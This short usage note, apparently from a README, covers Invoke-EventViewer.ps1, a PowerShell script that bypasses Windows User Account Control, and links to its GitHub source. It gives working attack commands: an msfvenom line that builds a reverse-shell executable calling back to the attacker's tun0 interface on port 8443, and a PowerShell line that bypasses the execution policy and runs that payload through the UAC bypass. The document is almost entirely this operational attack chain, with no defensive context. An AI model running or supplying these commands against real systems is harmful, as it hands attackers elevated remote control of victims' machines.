# Name
Invoke-EventViewer.ps1

## Usage
```
#To bypass UAC
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8443 EXITFUNC=thread -f exe -o reverse.exe
powershell -ep bypass Import-Module .\Invoke-EventViewer.ps1; Invoke-EventViewer c:\temp\reverse.exe
```

## Source
https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1
